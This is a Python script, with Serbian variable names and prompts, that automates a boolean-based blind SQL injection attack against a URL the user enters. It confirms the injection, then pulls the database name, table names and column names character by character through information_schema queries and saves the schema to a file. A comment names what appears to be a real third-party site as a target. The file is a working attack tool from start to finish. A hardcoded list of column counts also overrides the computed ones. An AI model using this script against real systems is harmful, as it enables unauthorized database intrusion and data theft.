import requests,random,string

# 'https://www.w3schools.com/'
# "http://www.belbana.com/our-products-detail.php?id=7 "

# -1 greska


url = input("unesite url za napad: ")
brojevi="0123456789"
slova="aqzxswedcvfrtgbnhyujmkiolpZAQSWXCEDFRVBGTYHNMJUIKLOP"
specijalni="~`!@#$^&*()_+{}|\";:'\\/?>.<,-+* "

karakteri = brojevi+slova+specijalni

def vrati_broj_kolona_u_bazi(url, tacno):
    i = 1
    netacno = requests.get(url + "and 5=6",)
    while True:
        pom = requests.get(url + "order by " + str(i))
        if pom.text == netacno.text:
            return i - 1
        elif i > 100:
            return -1
        i += 1

def vrati_duzinu_imena_baze(url):
    tacno = requests.get(url + " OR 3=3")
    i = 1
    while True:
        pom = requests.get(url + " AND 1=2 OR  (SELECT LENGTH(database()))=" + str(i))
        if pom.text == tacno.text:
            return i
        if i > 100:
            return -1
        i += 1

def vrati_duzinu_imena_tabele(url, broj_tabele):
    tacno = requests.get(url + " OR 3=3")
    i = 1
    while True:
        pom = requests.get(
            url + " AND 1=2 OR  (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT " + str(broj_tabele) + ",1)=" + str(i))
        if pom.text == tacno.text:
            return i
        if i > 100:
            return -1
        i += 1

def vrati_ime_tabele(duzina_imena, url, redni_broj_tabele):
    ime = ""
    tacno = requests.get(url + " OR 3=3")
    for i in range(duzina_imena):
        for j in karakteri:
            kveri = " AND 1=2 OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT " + str(
                redni_broj_tabele) + ",1) LIKE '" + ime + j + "%'"
            pom = requests.get(url + kveri)
            if pom.text == tacno.text:
                ime += j
                break
    return ime

def vrati_ime_baze(duzina_imena_baze):
    ime = ""
    tacno = requests.get(url + " OR 3=3")
    for i in range(duzina_imena_baze):
        for j in karakteri:
            kveri = " AND 1=2 OR (SELECT database()) LIKE '" + ime + j + "%'"
            pom = requests.get(url + kveri)
            if pom.text == tacno.text:
                ime += j
                break
    return ime

def vrati_broj_kolona_u_tabeli(ime_tabele,url):
    i = 1
    tacno = requests.get(url + "or 3=3")
    while True:
        pom = requests.get(url + "AND 1=2 OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+ime_tabele+"')=" + str(i))
        if pom.text == tacno.text:
            return i
        elif i > 100:
            return -1
        i += 1

def vrati_broj_tabela(url):
    i = 1
    tacno = requests.get(url + "or 3=3")
    while True:
        pom = requests.get(url + "AND 1=2 OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=" + str(i))
        if pom.text == tacno.text:
            return i
        elif i > 100:
            return -1
        i += 1

def vrati_ime_kolona(ime_tabele,broj_kolona):
    duzine_imena=[]
    for i in range(broj_kolona):
        j = 1
        tacno = requests.get(url + "or 3=3")
        while True:
            pom = requests.get(url + "AND 1=2 OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='"+ime_tabele+"' LIMIT "+str(i)+",1)=" + str(j))
            if pom.text == tacno.text:
                duzine_imena.append(j)
                break
            if j > 200:
                return -1
            j+=1

    imena_kolona=[]
    red_br_kolone=0
    for i in duzine_imena:
        ime=""
        for a in range(i):
            for karakter in karakteri:
                pom = requests.get(url + "AND 1=2 OR (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='"+ime_tabele+"' LIMIT "+str(red_br_kolone)+",1) LIKE '"+ime+karakter+"%'")
                if pom.text == tacno.text:
                    ime+=karakter
                    break
        imena_kolona.append(ime)
        red_br_kolone+=1
    return imena_kolona

def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def da_li_je_ranjiv(url):
    tacno = requests.get(url + " OR 3=3")
    netacno = requests.get(url + " AND 2=3")
    return [tacno.text, netacno.text]

[tacno, netacno] = da_li_je_ranjiv(url)

if not tacno == netacno:

    duzina_imena_baze = vrati_duzinu_imena_baze(url)

    if duzina_imena_baze == -1:
        print("greska -1 [prevelika duzina imena baze]")
    else:
        print("duzina imena baze: " + str(duzina_imena_baze))

        ime_baze=vrati_ime_baze(duzina_imena_baze)
        print("ime baze "+ime_baze)

        broj_tabela = vrati_broj_tabela(url)
        print("broj tabela: "+str(broj_tabela))

        if broj_tabela == -2:
            print("greska -2[previse tabela detektovao")
        else:
            print("broj tabela: " + str(broj_tabela))

            duzine_tabela = []

            for i in range(broj_tabela):
                duzine_tabela.append(vrati_duzinu_imena_tabele(url,i))

            imena_tabela = []
            j = 0

            for i in duzine_tabela:
                a = vrati_ime_tabele(i, url, j)
                print("tabela "+a)
                imena_tabela.append(a)
                j += 1
            print("imena tabela "+str(imena_tabela))

            brojevi_kolona_tabela=[]

            for i in imena_tabela:
                brojevi_kolona_tabela.append(vrati_broj_kolona_u_tabeli(i,url))

            brojevi_kolona_tabela=[3, 11, 7, 12, 54, 7, 7]

            imena_kolona = []

            for i in range(len(imena_tabela)):
                imena_kolona.append(vrati_ime_kolona(imena_tabela[i], brojevi_kolona_tabela[i]))

            obj=[]
            print("kolone")
            for i in range(len(imena_tabela)):
                print(imena_tabela[i])
                print(imena_kolona[i])
                obj.append({"tabela":imena_tabela[i],"kolone":imena_kolona[i]})

            r=randomString(8)

            file=r+".txt"
            f=open(file,"w")
            f.write("url[ " + url + " ]\n")
            f.write("baza podataka[ "+ime_baze+" ]\n")
            for i in obj:
                f.write("\ntabela[ "+i["tabela"]+" ] kolone { ")
                for j in i["kolone"]:
                    f.write(" "+j+", ")
                f.write("}")
            f.close()
            print("podaci upisani u "+file)

else:
    print("neuspelo [tacno==netacno")